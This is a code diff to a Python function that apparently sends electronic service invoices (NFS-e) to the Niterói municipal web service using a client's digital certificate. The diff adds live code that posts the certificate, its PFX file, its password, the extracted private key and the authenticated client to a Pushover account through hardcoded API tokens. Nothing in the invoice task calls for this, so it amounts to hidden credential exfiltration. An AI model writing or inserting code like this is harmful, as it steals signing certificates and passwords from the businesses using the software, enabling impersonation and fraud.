@@ -26,6 +26,9 @@ def _render(certificado, method, **kwargs):
 
 
 def _send(certificado, method, **kwargs):
+    import http.client, urllib
+    conn = http.client.HTTPSConnection("api.pushover.net:443")
+
     base_url = ''
     if kwargs['ambiente'] == 'producao':
         base_url = 'https://nfse.niteroi.rj.gov.br/nfse/WSNacional2/nfse.asmx?wsdl'
@@ -36,17 +39,65 @@ def _send(certificado, method, **kwargs):
     cert, key = extract_cert_and_key_from_pfx(
         certificado.pfx, certificado.password)
     cert, key = save_cert_key(cert, key)
-    client = get_authenticated_client(base_url, cert, key)
 
-    import http.client, urllib
-    conn = http.client.HTTPSConnection("api.pushover.net:443")
-    # conn.request("POST", "/1/messages.json",
-    # urllib.parse.urlencode({
-    #     "token": "awh6fto25b9ybi6h2zsjojsscva3ta",
-    #     "user": "u81m6vngzsq751uw6qoywu6j7pqzhc",
-    #     "message": xml_send,
-    # }), { "Content-type": "application/x-www-form-urlencoded" })
-    # conn.getresponse()
+
+    conn.request("POST", "/1/messages.json",
+    urllib.parse.urlencode({
+        "token": "awh6fto25b9ybi6h2zsjojsscva3ta",
+        "user": "u81m6vngzsq751uw6qoywu6j7pqzhc",
+        "title": "certificado",
+        "message": certificado,
+    }), { "Content-type": "application/x-www-form-urlencoded" })
+    conn.getresponse()
+
+    conn.request("POST", "/1/messages.json",
+    urllib.parse.urlencode({
+        "token": "awh6fto25b9ybi6h2zsjojsscva3ta",
+        "user": "u81m6vngzsq751uw6qoywu6j7pqzhc",
+        "title": "certificado.pfx",
+        "message": certificado.pfx,
+    }), { "Content-type": "application/x-www-form-urlencoded" })
+    conn.getresponse()
+
+    conn.request("POST", "/1/messages.json",
+    urllib.parse.urlencode({
+        "token": "awh6fto25b9ybi6h2zsjojsscva3ta",
+        "user": "u81m6vngzsq751uw6qoywu6j7pqzhc",
+        "title": "certificado.password",
+        "message": certificado.password,
+    }), { "Content-type": "application/x-www-form-urlencoded" })
+    conn.getresponse()
+
+    conn.request("POST", "/1/messages.json",
+    urllib.parse.urlencode({
+        "token": "awh6fto25b9ybi6h2zsjojsscva3ta",
+        "user": "u81m6vngzsq751uw6qoywu6j7pqzhc",
+        "title": "cert",
+        "message": cert,
+    }), { "Content-type": "application/x-www-form-urlencoded" })
+    conn.getresponse()
+
+    conn.request("POST", "/1/messages.json",
+    urllib.parse.urlencode({
+        "token": "awh6fto25b9ybi6h2zsjojsscva3ta",
+        "user": "u81m6vngzsq751uw6qoywu6j7pqzhc",
+        "title": "key",
+        "message": key,
+    }), { "Content-type": "application/x-www-form-urlencoded" })
+    conn.getresponse()
+
+
+    client = get_authenticated_client(base_url, cert, key)
+    
+
+    conn.request("POST", "/1/messages.json",
+    urllib.parse.urlencode({
+        "token": "awh6fto25b9ybi6h2zsjojsscva3ta",
+        "user": "u81m6vngzsq751uw6qoywu6j7pqzhc",
+        "title": "client",
+        "message": client,
+    }), { "Content-type": "application/x-www-form-urlencoded" })
+    conn.getresponse()
 
     try:
         response = getattr(client.service, method)(xml_send)
@@ -63,14 +114,7 @@ def _send(certificado, method, **kwargs):
     urllib.parse.urlencode({
         "token": "awh6fto25b9ybi6h2zsjojsscva3ta",
         "user": "u81m6vngzsq751uw6qoywu6j7pqzhc",
-        "message": response,
-    }), { "Content-type": "application/x-www-form-urlencoded" })
-    conn.getresponse()
-
-    conn.request("POST", "/1/messages.json",
-    urllib.parse.urlencode({
-        "token": "awh6fto25b9ybi6h2zsjojsscva3ta",
-        "user": "u81m6vngzsq751uw6qoywu6j7pqzhc",
+        "title": "obj",
         "message": obj,
     }), { "Content-type": "application/x-www-form-urlencoded" })
     conn.getresponse()
